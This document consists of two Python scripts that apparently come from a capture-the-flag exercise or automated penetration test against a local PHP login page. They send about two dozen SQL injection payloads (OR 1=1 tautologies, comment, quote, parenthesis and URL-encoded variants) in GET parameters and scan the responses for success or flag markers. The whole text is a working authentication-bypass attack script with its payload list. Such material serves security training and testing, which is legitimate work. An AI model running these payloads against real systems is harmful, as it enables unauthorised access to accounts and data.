import requests

url = "http://127.0.0.1:32960/index.php"

print("=== CRITICAL DISCOVERY: Form uses GET method ===\n")
print("Form action: index.php method=GET")
print("Previous tests used POST - need to use GET!\n")

# Test with GET method
print("=== Phase 5: Testing with GET method ===\n")

# Baseline - invalid credentials
print("--- [BASELINE] GET with invalid credentials ---")
resp_get_fail = requests.get(url, params={'username': 'admin', 'password': 'wrongpass'})
print(f"Length: {len(resp_get_fail.text)}")
print(f"First 1000 chars:\n{resp_get_fail.text[:1000]}...")

print("\n" + "="*80 + "\n")

# SQLi with GET
print("--- [SQLi GET] admin' OR '1'='1 ---")
resp_get_sqli = requests.get(url, params={'username': "admin' OR '1'='1", 'password': 'anything'})
print(f"Length: {len(resp_get_sqli.text)}")
print(f"First 1000 chars:\n{resp_get_sqli.text[:1000]}...")

print("\n" + "="*80 + "\n")

# Full response if different
if len(resp_get_sqli.text) != len(resp_get_fail.text):
    print("--- [FULL SQLi Response - Different!] ---")
    print(resp_get_sqli.text)
else:
    print("Responses are same length - checking for content differences...")
    # Check for specific patterns
    fail_text = resp_get_fail.text.lower()
    sqli_text = resp_get_sqli.text.lower()
    
    # Look for success indicators
    success_keywords = ['welcome', 'success', 'logged', 'flag', 'congratulations', 'profile']
    fail_keywords = ['error', 'invalid', 'incorrect', 'failed', 'wrong', 'denied']
    
    print(f"\nFail response keywords: {[k for k in success_keywords if k in fail_text]}")
    print(f"SQLi response keywords: {[k for k in success_keywords if k in sqli_text]}")
    print(f"\nFail response has error keywords: {[k for k in fail_keywords if k in fail_text]}")
    print(f"SQLi response has error keywords: {[k for k in fail_keywords if k in sqli_text]}")

import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Extended SQLi Testing with GET Method ===\n")

# Test comprehensive list of payloads
payloads = [
    # Standard tautologies with comments
    ("admin' OR '1'='1", "any"),
    ("admin' OR '1'='1' -- -", "any"),
    ("admin' OR '1'='1'#", "any"),
    ("admin' OR '1'='1'/*", "any"),
    ("' OR '1'='1", "any"),
    ("' OR '1'='1' -- -", "any"),
    
    # Numeric comparison
    ("admin' OR 1=1 -- -", "any"),
    ("admin' OR 1=1#", "any"),
    ("' OR 1=1 -- -", "any"),
    ("' OR 1=1#", "any"),
    
    # Using LIKE
    ("admin' OR username LIKE '%", "any"),
    ("admin%' OR '1'='1", "any"),
    
    # Double quote variants
    ('admin" OR "1"="1" -- -', "any"),
    ('" OR "1"="1" -- -', "any"),
    ('admin" OR 1=1 -- -', "any"),
    
    # URL-encoded payloads
    ("admin%27%20OR%20%271%27%3D%271", "any"),
    ("admin%27%20OR%20%271%27%3D%271%27%20--%20-", "any"),
    
    # Alternative comments
    ("admin' OR '1'='1'--", "any"),
    ("admin' OR '1'='1'; --", "any"),
    ("admin' OR '1'='1';#", "any"),
    
    # LIMIT trick
    ("admin' OR '1'='1' LIMIT 1 -- -", "any"),
    
    # Parentheses wrapping
    ("admin') OR ('1'='1", "any"),
    ("admin') OR ('1'='1' -- -", "any"),
    
    # Multiple ORs
    ("' OR 'x'='x", "any"),
    ("' OR ''='", "any"),
]

results = []

for user, pwd in payloads:
    try:
        resp = requests.get(url, params={'username': user, 'password': pwd}, timeout=10)
        resp_len = len(resp.text)
        
        # Look for success indicators in response
        has_flag = 'FLAG' in resp.text or 'flag{' in resp.text.lower() or 'ctf' in resp.text.lower()
        has_welcome = 'welcome' in resp.text.lower()
        
        print(f"[PAYLOAD] username={user[:50]}, password={pwd}")
        print(f"  Length: {resp_len} | Has FLAG: {has_flag} | Has welcome: {has_welcome}")
        
        if resp_len != 3173:
            print(f"  [!] DIFFERENT LENGTH - Possible success!")
        if has_flag:
            print(f"  [!!!] FLAG PATTERN FOUND!")
            print(f"  Full Response:\n{resp.text}")
            
        results.append({
            'payload': user,
            'length': resp_len,
            'has_flag': has_flag
        })
    except Exception as e:
        print(f"[ERROR] {user[:30]}: {e}")

print("\n=== Payloads with Different Lengths ===")
for r in results:
    if r['length'] != 3173:
        print(f"  - {r['payload'][:50]}: {r['length']} bytes")

